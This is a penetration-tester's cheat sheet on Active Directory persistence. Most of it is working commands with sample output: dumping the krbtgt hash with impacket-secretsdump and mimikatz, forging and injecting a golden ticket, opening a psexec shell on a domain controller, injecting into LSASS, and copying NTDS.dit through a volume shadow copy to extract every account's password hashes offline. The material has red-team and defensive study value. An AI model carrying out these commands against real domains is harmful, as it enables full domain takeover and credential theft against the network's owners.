# Active Directory Persistence Methods

* [Golden Kerberos Ticket from BlackHat 2014](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don%27t-Get-It.pdf)
* Shadow Copy

## AD Persistence and the GOLDEN Ticket

Silver Tickets aim to forge a TGS ticket to access a specific service. Golden Tickets **encrypted with krbtgt** give us permission to access the entire domain's resources. We can create a TGT stating that any non-privileged **user is a member of the Domain Admins group**, and the DC will trust it because it is correctly encrypted.

Scenario

* Requires: Access to an AD domain user in **Domain Admin** group or to a compromised **domain controller (DC)**
* Dump the NTLM hash of krbtgt
* Use mimikatz to create a golden ticket

Attacker

```shell
# Use impacket-secretsdump to dump krbtgt with access Domain Admin group account
```shell
impacket-secretsdump -just-dc-user krbtgt example.com/user:"password\!"@DC01.EXAMPLE.COM

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:e1cced9c6ef723837ff55e373d971633afb8af8871059f3451ce4bccfcca3d4c
krbtgt:aes128-cts-hmac-sha1-96:8c5cf3a1c6998fa43955fa096c336a69
krbtgt:des-cbc-md5:683bdcba9e7c5de9
```

```powershell
# Use mimikatz to dump krbtgt from the domain controller
privilege::debug
lsadump::lsa /patch

Domain : EXAMPLE / S-1-5-21-1987370270-658905905-1781884369
...

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 1693c6cefafffc7af11ef34d1c788f47
```

Kerberos :: Golden Ticket

* kerberos::golden
* /domain:chocolate.local <= domain name
* /sid:S-1-5-21-130452501-2365100805-3685010670 <= domain SID
* /krbtgt:1693c6cefafffc7af11ef34d1c788f47 <= NTLM hash of krbtgt
* /user:Administrateur <= username you wanna be
* /id:500 <= RID of username (500 is THE domain admin)
* /groups:513,512,520,518,519 <= Groups list of the user (be imaginative)
* /ptt <= inject into memory or create a file
* /ticket:Administrateur.kirbi <= the ticket filename

```plain
500 Administrator User	 => Default domain administrator account. Has full control over the domain.

512 Domain Admins	     => Members have administrative rights across all domain controllers.
513 Domain User          => Basic access to domain resources such as shared folders, printers, and intranet services. It does not grant administrative rights.
518 Schema Admins	     => Can modify the AD schema. Used for extending or changing schema definitions.
519 Enterprise Admins	 => Highest privilege group in a forest. Can administer any domain in the forest.
520 Group Policy Creator => Owners	Can create and edit Group Policy Objects (GPOs).
```

```powershell
# Use mimikatz to create the GOLGEN ticket
kerberos::purge
kerberos::golden /user:realadmin /domain:example.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt

User Id   : 500    
Groups Id : *513 512 520 518 519
...
Golden ticket for 'realadmin @ example.com' successfully submitted for current session


misc::cmd

# Use psexec to spawn a shell via SMB on DC
# Use hostname for kerberos auth !!!
psExec.exe \\dc01 cmd.exe 

# Access denied with IP address, because this forces NTLM auth
psexec.exe \\10.10.0.10 cmd.exe
Access is denied.

```

```powershell
privilege::debug

# Use mimikatz to export the Golden ticket the tickets of any user
kerberos::list [/export]

# Inject into workstation by pass-the-ticket (PtT)
kerberos::ptt ticket.kirbi
```

Inject AD Credentials in LSASS (untested)

* lsadump::lsa — Invokes the LSA dump module to extract credentials and secrets stored by the Local Security Authority.
* /inject — Injects into the LSASS process to access protected memory (requires SYSTEM privileges).
* /name:Administrateur — Filters the dump to only show secrets related to the user named "Administrateur".

```powershell
mimikatz # lsadump::lsa /inject /name:Administrateur
```

## AD Extract User Credential Offline with Shadow Copies

A Shadow Copy, also known as Volume Shadow Service (VSS) is a Microsoft backup technology. It allows snapshots of file or entire volumes.

Scenario:

* Requires: Access to privileged AD user on the **domain controller (DC)**
* Create a shodow copy of the volume on domain controller
* Extract Active Directory Database NTDS.dit database file from copy
* Use NTDS.dit and SYSTEM hive to extract any user credentials offline

Victim (DC)

* -nw disable writers
* -p store the full disk

```powershell
# Create a shodow copy of the volume on domain controller
vshadow.exe -nw -p  C:
...
  Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4

copy.exe \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\ntds\ntds.dit c:\ntds.dit.bak

# Dump the registry SYSTEM hive from domain controller
reg.exe save hklm\system c:\system.bak
```

Attacker

```shell
# Extract any user credential offline including krbtgt
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
...

[*] Reading and decrypting hashes from ntds.dit.bak
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::

DC1$:1000:aad3b435b51404eeaad3b435b51404ee:eda4af1186051537c77fa4f53ce2fe1a:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::

[*] Kerberos keys from ntds.dit.bak
Administrator:aes256-cts-hmac-sha1-96:56136fd5bbd512b3670c581ff98144a553888909a7bf8f0fd4c424b0d42b0cdc
Administrator:aes128-cts-hmac-sha1-96:3d58eb136242c11643baf4ec85970250
Administrator:des-cbc-md5:fd79dc380ee989a4

DC1$:aes256-cts-hmac-sha1-96:fb2255e5983e493caaba2e5693c67ceec600681392e289594b121dab919cef2c
DC1$:aes128-cts-hmac-sha1-96:68cf0d124b65310dd65c100a12ecf871
DC1$:des-cbc-md5:f7f804ce43264a43
krbtgt:aes256-cts-hmac-sha1-96:e1cced9c6ef723837ff55e373d971633afb8af8871059f3451ce4bccfcca3d4c
krbtgt:aes128-cts-hmac-sha1-96:8c5cf3a1c6998fa43955fa096c336a69
krbtgt:des-cbc-md5:683bdcba9e7c5de9
```

AD Offline Attack (untested)

```bash
# Just” need : ntds.dit & SYSTEM hive
# NTDSXtract : http://www.ntdsxtract.com
python dsusers.py ntds.dit.export/datatable.4 ntds.dit.export/link_table.7 ./work --name
Administrateur --syshive SYSTEM --supplcreds --passwordhashes --lmoutfile ./lm --ntoutfile
./nt --pwdformat john

```